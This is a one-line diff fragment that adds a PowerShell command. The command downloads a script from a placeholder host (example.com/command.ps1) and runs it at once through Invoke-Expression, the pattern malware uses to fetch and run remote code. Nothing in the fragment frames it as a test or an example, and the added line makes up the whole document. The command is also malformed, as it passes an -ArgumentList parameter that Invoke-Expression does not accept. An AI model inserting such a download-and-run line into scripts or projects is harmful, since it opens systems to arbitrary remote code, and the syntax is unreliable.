@@ -1,0 +1,1 @@
+iex (New-Object Net.WebClient).DownloadString('http://example.com/command.ps1') -ArgumentList 'param1', 'param2'
